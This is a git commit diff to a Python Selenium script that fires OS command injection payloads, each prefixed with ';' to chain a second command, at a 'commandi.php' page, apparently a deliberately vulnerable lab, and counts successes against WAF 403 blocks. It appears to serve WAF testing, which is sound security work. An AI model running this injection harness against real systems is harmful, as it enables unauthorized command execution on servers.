8db20ad2aa2287e5e060b9f3563b8e3273183fae
Dror <dror@dvash.org>
2021-01-01 00:11:20 +0200

    improved A1_Injection.py

--- A1_Injection.py
+++ A1_Injection.py
@@ -39,26 +39,37 @@ def execute():
 
 def implement_attack(driver, target_url):
     attack_url_page = "commandi.php"  # OS Command Injection
-    result_counter = 0
+    success_counter = 0
+    blocked_by_waf_counter = 0
+    length_of_payload_file = 0
 
     with open("Payloads/OS_Injection.txt", 'r', encoding='latin-1') as payload_list:
         for payload in payload_list.read().splitlines():
+            length_of_payload_file += 1
             try:
                 # Load page
                 driver.get(target_url + attack_url_page)
                 # Send payload
                 driver.find_element_by_id("target").clear()
-                driver.find_element_by_id("target").send_keys(payload, Keys.RETURN)
+                driver.find_element_by_id("target").send_keys(";"+payload, Keys.RETURN)
                 # Look for success
                 att = driver.find_element_by_xpath("//div[@id='main']/p[@align='left']").text
-                if att != "":
-                    print("\nAttack Passed:", payload)
-                    print(att)
 
-                result_counter += 1
+                if att != "":
+                    if "Server: 127.0.0.53" not in att:
+                        #print("\nAttack Passed:", payload)
+                        #print(att)
+                        success_counter += 1
 
             except NoSuchElementException:
-                pass
-        print(f"[+] Total Passed Attacks:", result_counter, "/", len(payload_list))
+                waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
+                if "403 Forbidden" == waf_block_message:
+                    print("\nAttack Blocked:", payload)
+                    blocked_by_waf_counter +=1
+
+        print(f"[+] ~~OS Injection Results~~ [+]")
+        print(f"[+] Total Successful Attacks:", success_counter)
+        print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
+        print(f"[+] Total Failed Attacks:", length_of_payload_file - blocked_by_waf_counter - success_counter)
 
 execute()
